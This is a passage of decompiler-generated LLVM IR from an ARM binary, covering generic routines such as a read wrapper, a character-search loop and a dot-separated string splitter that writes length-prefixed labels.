  %v0_14698 = load i32, i32* @sl, align 4
  store i32 %v0_14698, i32* %r0.global-to-local, align 4
  store i32 %v3_14380, i32* @r4, align 4
  store i32 %v6_14380, i32* @r5, align 4
  store i32 %v12_14380, i32* @r7, align 4
  store i32 %v15_14380, i32* @r8, align 4
  store i32 %v21_14380, i32* @sl, align 4
  store i32 %v24_14380, i32* @fp, align 4
  ret i32 %v0_14698

; uselistorder directives
  uselistorder i32 %v1_145f0, { 1, 0 }
  uselistorder i32 %v0_145b4, { 1, 0 }
  uselistorder i32 %v3_1455023, { 1, 0 }
  uselistorder i32 %v0_1455020, { 1, 0 }
  uselistorder i32 %v2_1452c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.0, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-40.1, { 1, 0 }
  uselistorder i32 %v0_1442c, { 1, 0 }
  uselistorder i32 %v0_143f0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_143d4, { 1, 0 }
  uselistorder i32 %v0_143a0, { 1, 0, 2 }
  uselistorder i32 %v0_14394, { 0, 2, 1, 3 }
  uselistorder i32 %v1_14390, { 4, 2, 3, 1, 0 }
  uselistorder i32 %tmp61, { 1, 0, 3, 2 }
  uselistorder i32 %tmp57, { 0, 2, 3, 1 }
  uselistorder i32 %tmp56, { 3, 0, 1, 2 }
  uselistorder i32 %tmp53, { 0, 4, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 10, 16, 11, 12, 13, 14, 15, 24, 17, 18, 1, 2, 3, 4, 5, 6, 7, 8, 9, 19, 20, 21, 22, 23 }
  uselistorder i32* %r2.global-to-local, { 13, 3, 4, 8, 9, 18, 10, 19, 11, 12, 20, 0, 1, 2, 5, 6, 7, 14, 16, 15, 17 }
  uselistorder i32* %r1.global-to-local, { 11, 2, 5, 6, 7, 13, 8, 14, 9, 10, 0, 1, 3, 4, 12 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 1, 22, 21, 11, 6, 13, 12, 14, 15, 18, 16, 17, 20, 19, 2, 3, 4, 7, 8, 9, 10, 23, 25, 24 }
  uselistorder i32* %ip.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 34, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 (i8*)* @function_cc14, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 (i32, i32, i32)* @function_e500, { 4, 3, 0, 2, 1 }
  uselistorder i32 (i8*, i32)* @function_f0f4, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 7, { 2, 9, 10, 4, 5, 6, 0, 13, 12, 1, 7, 8, 11, 3 }
  uselistorder i32* @global_var_18428, { 0, 6, 2, 7, 1, 3, 4, 8, 5 }
  uselistorder i32 10, { 5, 6, 33, 7, 8, 34, 35, 36, 37, 38, 25, 14, 26, 13, 27, 28, 15, 29, 30, 39, 4, 40, 41, 42, 43, 12, 16, 45, 17, 46, 47, 18, 48, 19, 20, 0, 9, 10, 21, 24, 3, 44, 49, 11, 1, 31, 22, 32, 2, 23 }
  uselistorder i32 80, { 0, 4, 5, 6, 1, 7, 2, 3 }
  uselistorder i32 48, { 9, 5, 6, 7, 8, 10, 2, 11, 12, 13, 3, 4, 14, 15, 16, 18, 17, 1, 0, 19 }
  uselistorder i32 36, { 4, 5, 6, 7, 8, 9, 10, 3, 1, 14, 2, 0, 11, 12, 13 }
  uselistorder i32 56, { 2, 4, 5, 3, 6, 1, 0, 7, 8 }
  uselistorder i32 44, { 2, 3, 4, 6, 7, 10, 1, 8, 5, 0, 9 }
  uselistorder i32 -48, { 2, 3, 0, 4, 5, 6, 7, 1 }
  uselistorder i32* @fp, { 27, 30, 28, 1, 29, 31, 32, 33, 34, 0, 36, 35, 37, 38, 39, 2, 40, 41, 42, 43, 44, 45, 46, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 3, 4, 5, 6, 7, 8, 9, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 47, 48, 67, 68, 69, 70, 49, 50, 51, 64, 65, 66, 11, 12, 13 }
  uselistorder label %dec_label_pc_14698, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_14694, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_14664, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_14660, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14604, { 1, 0 }
  uselistorder label %dec_label_pc_145b0, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_14550.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_14590, { 1, 0 }
  uselistorder label %dec_label_pc_1450c, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_143c0, { 1, 0 }
}

define i32 @function_146a8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_146a8:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_146ec, label %dec_label_pc_146d8

dec_label_pc_146d8:                               ; preds = %dec_label_pc_146a8
  %v0_146d8 = call i32 @function_cc08()
  %v0_146dc = load i32, i32* %r4.global-to-local, align 4
  %v1_146dc = sub i32 0, %v0_146dc
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_146e4 = inttoptr i32 %v0_146d8 to i32*
  store i32 %v1_146dc, i32* %v2_146e4, align 4
  %v0_146f4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_146f4

dec_label_pc_146ec:                               ; preds = %dec_label_pc_146a8
  %v2_146ec = icmp eq i32 %arg1, 0
  br i1 %v2_146ec, label %dec_label_pc_14700, label %dec_label_pc_146f4

dec_label_pc_146f4:                               ; preds = %dec_label_pc_146ec, %dec_label_pc_146d8
  %v0_146f4 = phi i32 [ %arg1, %dec_label_pc_146ec ], [ %v0_146f4.pre, %dec_label_pc_146d8 ]
  br label %dec_label_pc_14704

dec_label_pc_14700:                               ; preds = %dec_label_pc_146ec
  br label %dec_label_pc_14704

dec_label_pc_14704:                               ; preds = %dec_label_pc_146f4, %dec_label_pc_14700
  %v14_14708 = phi i32 [ %v0_146f4, %dec_label_pc_146f4 ], [ %tmp9, %dec_label_pc_14700 ]
  ret i32 %v14_14708

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_14704, { 1, 0 }
}

define i32 @function_1470c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1470c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1470c = load i32, i32* @r4, align 4
  store i32 %v3_1470c, i32* %stack_var_-8, align 4
  %v1_14710 = load i32, i32* @r1, align 4
  %v2_14710 = inttoptr i32 %v1_14710 to i32*
  %v3_14710 = load i32, i32* @r2, align 4
  %v4_14710 = call i32 @read(i32 %arg1, i32* %v2_14710, i32 %v3_14710)
  store i32 %v4_14710, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_14710, -4095
  br i1 %tmp, label %dec_label_pc_14730, label %dec_label_pc_14720

dec_label_pc_14720:                               ; preds = %dec_label_pc_1470c
  %v0_14720 = call i32 @function_cc08()
  %v0_14724 = load i32, i32* %r4.global-to-local, align 4
  %v1_14724 = sub i32 0, %v0_14724
  %v2_14728 = inttoptr i32 %v0_14720 to i32*
  store i32 %v1_14724, i32* %v2_14728, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14730

dec_label_pc_14730:                               ; preds = %dec_label_pc_1470c, %dec_label_pc_14720
  %v0_14730 = phi i32 [ %v4_14710, %dec_label_pc_1470c ], [ -1, %dec_label_pc_14720 ]
  %v2_14734 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14734, i32* @r4, align 4
  ret i32 %v0_14730

; uselistorder directives
  uselistorder i32 %v4_14710, { 1, 0, 2 }
  uselistorder i32 ()* @function_cc08, { 24, 38, 44, 69, 68, 67, 43, 23, 37, 36, 20, 59, 22, 19, 42, 35, 34, 58, 11, 10, 57, 9, 51, 8, 7, 6, 5, 56, 55, 4, 3, 2, 70, 50, 49, 48, 47, 66, 65, 18, 33, 64, 46, 32, 31, 41, 30, 29, 40, 28, 27, 16, 0, 17, 12, 54, 53, 52, 21, 45, 26, 14, 1, 39, 13, 25, 15, 63, 62, 61, 60 }
  uselistorder label %dec_label_pc_14730, { 1, 0 }
}

define i32 @function_14738(i32 %arg1) local_unnamed_addr {
dec_label_pc_14738:
  %v1_14740 = icmp slt i32 %arg1, 0
  br i1 %v1_14740, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_14738
  ret i32 %arg1

bb1:                                              ; preds = %dec_label_pc_14738
  %v2_14740 = mul i32 %arg1, 2
  %v2_1474c = load i32, i32* bitcast (i32** @global_var_18430.402 to i32*), align 4
  %v2_14750 = add i32 %v2_1474c, %v2_14740
  %v3_14754 = inttoptr i32 %v2_14750 to i8*
  %v4_14754 = load i8, i8* %v3_14754, align 1
  %v6_14754 = zext i8 %v4_14754 to i32
  %v1_14758 = add i32 %v2_14750, 1
  %v2_14758 = inttoptr i32 %v1_14758 to i8*
  %v3_14758 = load i8, i8* %v2_14758, align 1
  %v4_14758 = zext i8 %v3_14758 to i32
  %v3_1475c = mul nuw i32 %v4_14758, 16777216
  %v4_14760 = sdiv i32 %v3_1475c, 65536
  %v5_14760 = or i32 %v4_14760, %v6_14754
  ret i32 %v5_14760

; uselistorder directives
  uselistorder i32 %v2_14750, { 1, 0 }
}

define i32 @function_1476c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1476c:
  %v6_1476c = load i32, i32* @r5, align 4
  %v9_1476c = load i32, i32* @r6, align 4
  %v1_14770 = urem i32 %arg1, 256
  br label %dec_label_pc_14790

dec_label_pc_14778:                               ; preds = %dec_label_pc_14790
  %v3_14778 = load i8, i8* %.0, align 1
  %v4_14778 = zext i8 %v3_14778 to i32
  %v9_1477c = icmp eq i32 %v4_14778, %v1_14770
  br i1 %v9_1477c, label %bb, label %bb24

bb:                                               ; preds = %dec_label_pc_14778
  ret i32 %v1_14790

bb24:                                             ; preds = %dec_label_pc_14778
  %v2_14784 = icmp eq i8 %v3_14778, 0
  %v2_14788 = add i32 %v1_14790, 1
  %v3_14788 = inttoptr i32 %v2_14788 to i8*
  br i1 %v2_14784, label %dec_label_pc_14864, label %dec_label_pc_14790

dec_label_pc_14790:                               ; preds = %bb24, %dec_label_pc_1476c
  %.0 = phi i8* [ undef, %dec_label_pc_1476c ], [ %v3_14788, %bb24 ]
  %v1_14790 = ptrtoint i8* %.0 to i32
  %v2_14790 = urem i32 %v1_14790, 4
  %v3_14790 = icmp eq i32 %v2_14790, 0
  br i1 %v3_14790, label %dec_label_pc_14798, label %dec_label_pc_14778

dec_label_pc_14798:                               ; preds = %dec_label_pc_14790
  %v4_14798 = mul nuw nsw i32 %v1_14770, 256
  %v5_14798 = or i32 %v4_14798, %v1_14770
  %v4_147a0 = mul i32 %v5_14798, 65536
  %v5_147a0 = or i32 %v4_147a0, %v5_14798
  br label %dec_label_pc_147a4

dec_label_pc_147a4:                               ; preds = %dec_label_pc_1485c, %dec_label_pc_147e4, %dec_label_pc_14798
  %v0_14808 = phi i32 [ %v1_14790, %dec_label_pc_14798 ], [ %v4_147a4, %dec_label_pc_147e4 ], [ %v4_147a4, %dec_label_pc_1485c ]
  %v1_147a4 = inttoptr i32 %v0_14808 to i32*
  %v2_147a4 = load i32, i32* %v1_147a4, align 4
  %v4_147a4 = add i32 %v0_14808, 4
  %v2_147ac = xor i32 %v2_147a4, %v5_147a0
  %v2_147b8 = add i32 %v2_147a4, 2130640639
  %v1_147bc = sub i32 -1, %v2_147a4
  %v2_147c0 = xor i32 %v2_147b8, %v1_147bc
  %v2_147c4 = add i32 %v2_147ac, 2130640639
  %v1_147cc = sub i32 -1, %v2_147ac
  %v2_147d0 = and i32 %v2_147c0, -2130640640
  %v2_147d4 = xor i32 %v2_147c4, %v1_147cc
  %v2_147d8 = icmp eq i32 %v2_147d0, 0
  %v2_147dc = and i32 %v2_147d4, -2130640640
  store i32 %v2_147dc, i32* @lr, align 4
  br i1 %v2_147d8, label %dec_label_pc_147e4, label %dec_label_pc_147ec

dec_label_pc_147e4:                               ; preds = %dec_label_pc_147a4
  %v2_147e4 = icmp eq i32 %v2_147dc, 0
  br i1 %v2_147e4, label %dec_label_pc_147a4, label %dec_label_pc_147ec

dec_label_pc_147ec:                               ; preds = %dec_label_pc_147a4, %dec_label_pc_147e4
  %v2_147ec = inttoptr i32 %v0_14808 to i8*
  %v3_147ec = load i8, i8* %v2_147ec, align 1
  %v4_147ec = zext i8 %v3_147ec to i32
  %v1_147f4 = add i32 %v0_14808, 1
  %v1_147f8 = add i32 %v0_14808, 2
  %v9_147fc = icmp eq i32 %v4_147ec, %v1_14770
  %v1_14800 = add i32 %v0_14808, 3
  br i1 %v9_147fc, label %dec_label_pc_14808, label %dec_label_pc_14810

dec_label_pc_14808:                               ; preds = %dec_label_pc_147ec
  store i32 %v6_1476c, i32* @r5, align 4
  store i32 %v9_1476c, i32* @r6, align 4
  ret i32 %v0_14808

dec_label_pc_14810:                               ; preds = %dec_label_pc_147ec
  %v2_14810 = icmp eq i8 %v3_147ec, 0
  br i1 %v2_14810, label %dec_label_pc_14864, label %dec_label_pc_14818

dec_label_pc_14818:                               ; preds = %dec_label_pc_14810
  %v2_14818 = inttoptr i32 %v1_147f4 to i8*
  %v3_14818 = load i8, i8* %v2_14818, align 1
  %v4_14818 = zext i8 %v3_14818 to i32
  %v9_1481c = icmp eq i32 %v4_14818, %v1_14770
  br i1 %v9_1481c, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_14818
  store i32 %v6_1476c, i32* @r5, align 4
  store i32 %v9_1476c, i32* @r6, align 4
  ret i32 %v1_147f4

bb26:                                             ; preds = %dec_label_pc_14818
  %v2_14824 = icmp eq i8 %v3_14818, 0
  br i1 %v2_14824, label %dec_label_pc_14864, label %dec_label_pc_1482c

dec_label_pc_1482c:                               ; preds = %bb26
  %v2_1482c = inttoptr i32 %v1_147f8 to i8*
  %v3_1482c = load i8, i8* %v2_1482c, align 1
  %v4_1482c = zext i8 %v3_1482c to i32
  %v9_14830 = icmp eq i32 %v4_1482c, %v1_14770
  br i1 %v9_14830, label %dec_label_pc_14838, label %dec_label_pc_14840

dec_label_pc_14838:                               ; preds = %dec_label_pc_1482c
  store i32 %v6_1476c, i32* @r5, align 4
  store i32 %v9_1476c, i32* @r6, align 4
  ret i32 %v1_147f8

dec_label_pc_14840:                               ; preds = %dec_label_pc_1482c
  %v2_14840 = icmp eq i8 %v3_1482c, 0
  br i1 %v2_14840, label %dec_label_pc_14864, label %dec_label_pc_14848

dec_label_pc_14848:                               ; preds = %dec_label_pc_14840
  %v2_14848 = inttoptr i32 %v1_14800 to i8*
  %v3_14848 = load i8, i8* %v2_14848, align 1
  %v4_14848 = zext i8 %v3_14848 to i32
  %v9_1484c = icmp eq i32 %v4_14848, %v1_14770
  br i1 %v9_1484c, label %dec_label_pc_14854, label %dec_label_pc_1485c

dec_label_pc_14854:                               ; preds = %dec_label_pc_14848
  store i32 %v6_1476c, i32* @r5, align 4
  store i32 %v9_1476c, i32* @r6, align 4
  ret i32 %v1_14800

dec_label_pc_1485c:                               ; preds = %dec_label_pc_14848
  %v2_1485c = icmp eq i8 %v3_14848, 0
  br i1 %v2_1485c, label %dec_label_pc_14864, label %dec_label_pc_147a4

dec_label_pc_14864:                               ; preds = %bb24, %dec_label_pc_1485c, %dec_label_pc_14840, %bb26, %dec_label_pc_14810
  store i32 %v6_1476c, i32* @r5, align 4
  store i32 %v9_1476c, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_147a4, { 1, 0 }
  uselistorder i32 %v2_147a4, { 0, 2, 1 }
  uselistorder i32 %v0_14808, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_14798, { 1, 0 }
  uselistorder i32 %v1_14790, { 1, 0, 2, 3 }
  uselistorder i8* %.0, { 1, 0 }
  uselistorder i32 %v1_14770, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 %v9_1476c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v6_1476c, { 3, 0, 1, 2, 4 }
  uselistorder i32 -2130640640, { 2, 5, 6, 7, 3, 0, 8, 4, 1 }
  uselistorder i32 2130640639, { 1, 2, 5, 6, 3, 0, 4 }
  uselistorder i8* undef, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14864, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_147ec, { 1, 0 }
}

define i32 @function_14874(i8* %arg1) local_unnamed_addr {
dec_label_pc_14874:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14874 = load i32, i32* @r4, align 4
  store i32 %v3_14874, i32* %stack_var_-24, align 4
  %v6_14874 = load i32, i32* @r5, align 4
  %v9_14874 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_1487c = load i32, i32* @r1, align 4
  store i32 %v0_1487c, i32* @r6, align 4
  %v0_14880 = load i32, i32* @r2, align 4
  store i32 %v0_14880, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_148e819 = icmp slt i8* %arg1, null
  store i1 %v1_148e819, i1* %cpsr_n.global-to-local, align 1
  %v2_148e820 = icmp eq i8* %arg1, null
  store i1 %v2_148e820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_148e820, label %dec_label_pc_14900, label %dec_label_pc_148f4

dec_label_pc_1488c:                               ; preds = %dec_label_pc_148f4
  %v2_1488c = call i32 @function_1476c(i32 %v0_1488c21, i32 46)
  store i32 %v2_1488c, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14890 = icmp slt i32 %v2_1488c, 0
  store i1 %v1_14890, i1* %cpsr_n.global-to-local, align 1
  %v2_14890 = icmp eq i32 %v2_1488c, 0
  store i1 %v2_14890, i1* %cpsr_z.global-to-local, align 1
  %v0_14894 = load i32, i32* @r4, align 4
  %v2_14894 = sub i32 %v2_1488c, %v0_14894
  store i32 %v2_14894, i32* %ip.global-to-local, align 4
  store i32 %v0_14894, i32* @r0, align 4
  br i1 %v2_14890, label %dec_label_pc_148a0, label %dec_label_pc_148a8

dec_label_pc_148a0:                               ; preds = %dec_label_pc_1488c
  %v0_148a0 = call i32 @function_ecc0()
  store i32 %v0_148a0, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v0_148a0, 16777216
  %v1_148a4 = sdiv i32 %sext, 16777216
  store i32 %v1_148a4, i32* %ip.global-to-local, align 4
  %v0_148b4.pre = load i32, i32* @r4, align 4
  %v0_148c4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_148a8

dec_label_pc_148a8:                               ; preds = %dec_label_pc_1488c, %dec_label_pc_148a0
  %v0_148c4 = phi i32 [ %v2_1488c, %dec_label_pc_1488c ], [ %v0_148c4.pre, %dec_label_pc_148a0 ]
  %v0_148b4 = phi i32 [ %v0_14894, %dec_label_pc_1488c ], [ %v0_148b4.pre, %dec_label_pc_148a0 ]
  %v0_148d4 = phi i32 [ %v2_14894, %dec_label_pc_1488c ], [ %v1_148a4, %dec_label_pc_148a0 ]
  %v0_148a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_148a8 = add i32 %v0_148a8, 1
  store i32 %v1_148a8, i32* @lr, align 4
  %v1_148ac = load i32, i32* %r8.global-to-local, align 4
  %v2_148ac = sub i32 %v1_148ac, %v0_148a8
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_148b0 = icmp slt i32 %v0_148d4, 0
  store i1 %v1_148b0, i1* %cpsr_n.global-to-local, align 1
  %v2_148b0 = icmp eq i32 %v0_148d4, 0
  store i1 %v2_148b0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_148b4, i32* @r1, align 4
  %v0_148b8 = load i32, i32* @r6, align 4
  %v2_148b8 = add i32 %v0_148b8, %v1_148a8
  store i32 %v2_148b8, i32* @r0, align 4
  store i32 %v0_148d4, i32* @r2, align 4
  %v1_148c0 = add i32 %v2_148ac, -1
  %v1_148c4 = add i32 %v0_148c4, 1
  store i32 %v1_148c4, i32* @r4, align 4
  br i1 %v2_148b0, label %.loopexit, label %dec_label_pc_148cc

dec_label_pc_148cc:                               ; preds = %dec_label_pc_148a8
  %v2_148cc = sub i32 %v0_148d4, %v1_148c0
  %v3_148cc = icmp ult i32 %v0_148d4, %v1_148c0
  %v4_148cc = xor i32 %v1_148c0, %v0_148d4
  %v5_148cc = xor i32 %v2_148cc, %v0_148d4
  %v6_148cc = and i32 %v5_148cc, %v4_148cc
  %v7_148cc = icmp slt i32 %v6_148cc, 0
  store i1 %v7_148cc, i1* %cpsr_v.global-to-local, align 1
  %v8_148cc = icmp slt i32 %v2_148cc, 0
  store i1 %v8_148cc, i1* %cpsr_n.global-to-local, align 1
  %v9_148cc = icmp eq i32 %v0_148d4, %v1_148c0
  store i1 %v9_148cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_148cc, label %dec_label_pc_148d4, label %.loopexit

dec_label_pc_148d4:                               ; preds = %dec_label_pc_148cc
  %v1_148d4 = trunc i32 %v0_148d4 to i8
  %v4_148d4 = add i32 %v0_148b8, %v0_148a8
  %v5_148d4 = inttoptr i32 %v4_148d4 to i8*
  store i8 %v1_148d4, i8* %v5_148d4, align 1
  %v0_148d8 = load i32, i32* @lr, align 4
  %v1_148d8 = load i32, i32* %ip.global-to-local, align 4
  %v2_148d8 = add i32 %v1_148d8, %v0_148d8
  store i32 %v2_148d8, i32* %r7.global-to-local, align 4
  %v0_148dc = call i32 @function_ec10()
  store i32 %v0_148dc, i32* %r0.global-to-local, align 4
  %v0_148e0 = load i32, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_148e0 = icmp slt i32 %v0_148e0, 0
  store i1 %v1_148e0, i1* %cpsr_n.global-to-local, align 1
  %v2_148e0 = icmp eq i32 %v0_148e0, 0
  store i1 %v2_148e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_148e0, label %dec_label_pc_14900, label %dec_label_pc_148d4.dec_label_pc_148e8_crit_edge

dec_label_pc_148d4.dec_label_pc_148e8_crit_edge:  ; preds = %dec_label_pc_148d4
  %v0_148e8.pre = load i32, i32* @r4, align 4
  store i32 %v0_148e8.pre, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_148e8 = icmp slt i32 %v0_148e8.pre, 0
  store i1 %v1_148e8, i1* %cpsr_n.global-to-local, align 1
  %v2_148e8 = icmp eq i32 %v0_148e8.pre, 0
  store i1 %v2_148e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_148e8, label %dec_label_pc_14900, label %dec_label_pc_148f4

dec_label_pc_148f4:                               ; preds = %dec_label_pc_14874, %dec_label_pc_148d4.dec_label_pc_148e8_crit_edge
  %v0_1488c21 = phi i32 [ %v0_148e8.pre, %dec_label_pc_148d4.dec_label_pc_148e8_crit_edge ], [ %tmp, %dec_label_pc_14874 ]
  %v1_148f4 = inttoptr i32 %v0_1488c21 to i8*
  %v2_148f4 = load i8, i8* %v1_148f4, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_148f8 = icmp eq i8 %v2_148f4, 0
  store i1 %v2_148f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_148f8, label %dec_label_pc_14900, label %dec_label_pc_1488c

dec_label_pc_14900:                               ; preds = %dec_label_pc_148d4.dec_label_pc_148e8_crit_edge, %dec_label_pc_148d4, %dec_label_pc_148f4, %dec_label_pc_14874
  %v0_14900 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14900 = icmp slt i32 %v0_14900, 0
  store i1 %v1_14900, i1* %cpsr_n.global-to-local, align 1
  %v2_14900 = icmp eq i32 %v0_14900, 0
  store i1 %v2_14900, i1* %cpsr_z.global-to-local, align 1
  %tmp16 = icmp slt i32 %v0_14900, 1
  br i1 %tmp16, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_14900
  %v5_14908 = load i32, i32* %r7.global-to-local, align 4
  %v6_14908 = add i32 %v5_14908, 1
  store i32 %v6_14908, i32* %r0.global-to-local, align 4
  %v7_1490c = load i32, i32* @r6, align 4
  %v9_1490c = add i32 %v7_1490c, %v5_14908
  %v10_1490c = inttoptr i32 %v9_1490c to i8*
  store i8 0, i8* %v10_1490c, align 1
  %v0_14910.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_14910.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_14910.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_14900, %bb
  %v2_14910 = phi i1 [ %v2_14910.pre, %bb ], [ false, %dec_label_pc_14900 ]
  %v1_14910 = phi i1 [ %v1_14910.pre, %bb ], [ %v1_14900, %dec_label_pc_14900 ]
  %v0_14910 = phi i1 [ %v0_14910.pre, %bb ], [ %v2_14900, %dec_label_pc_14900 ]
  %v3_14910 = xor i1 %v2_14910, %v1_14910
  %v4_14910 = or i1 %v0_14910, %v3_14910
  br i1 %v4_14910, label %.loopexit, label %bb18

bb18:                                             ; preds = %bb17
  %v7_14910 = load i32, i32* %stack_var_-24, align 4
  store i32 %v7_14910, i32* @r4, align 4
  store i32 %v6_14874, i32* @r5, align 4
  store i32 %v9_14874, i32* @r6, align 4
  %v25_14910 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v25_14910

.loopexit:                                        ; preds = %dec_label_pc_148cc, %dec_label_pc_148a8, %bb17
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14918 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14918, i32* @r4, align 4
  store i32 %v6_14874, i32* @r5, align 4
  store i32 %v9_14874, i32* @r6, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_14900, { 0, 2, 1 }
  uselistorder i32 %v0_148e8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_148e0, { 1, 0 }
  uselistorder i32 %v2_148cc, { 1, 0 }
  uselistorder i32 %v1_148c0, { 2, 0, 3, 1 }
  uselistorder i32 %v0_148d4, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_148a4, { 1, 0 }
  uselistorder i1 %v2_148e820, { 1, 0 }
  uselistorder i32 %v9_14874, { 1, 0 }
  uselistorder i32 %v6_14874, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 6, 2, 7, 4, 5, 1, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @function_ecc0, { 12, 31, 30, 10, 11, 6, 5, 4, 29, 9, 8, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 7, 2, 0, 1, 3 }
  uselistorder i32 (i32, i32)* @function_1476c, { 2, 1, 0 }
  uselistorder i32 46, { 0, 2, 3, 1 }
  uselistorder label %.loopexit, { 2, 0, 1 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_14900, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_148f4, { 1, 0 }
  uselistorder label %dec_label_pc_148a8, { 1, 0 }
}

define i32 @function_1491c() local_unnamed_addr {
dec_label_pc_1491c:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_1491c = load i32, i32* @r4, align 4
  %v6_1491c = load i32, i32* @r5, align 4
  %v0_14920 = load i32, i32* @r0, align 4
  store i32 %v0_14920, i32* %sl.global-to-local, align 4
  %v2_14920 = icmp eq i32 %v0_14920, 0
  br i1 %v2_14920, label %.thread16, label %dec_label_pc_149c0.preheader

.thread16:                                        ; preds = %dec_label_pc_1491c
  %v0_1492c1 = load i32, i32* @r2, align 4
  store i32 %v0_1492c1, i32* %sb.global-to-local, align 4
  %v0_149302 = load i32, i32* @r3, align 4
  store i32 %v0_149302, i32* %stack_var_-40, align 4
  br label %dec_label_pc_149e0

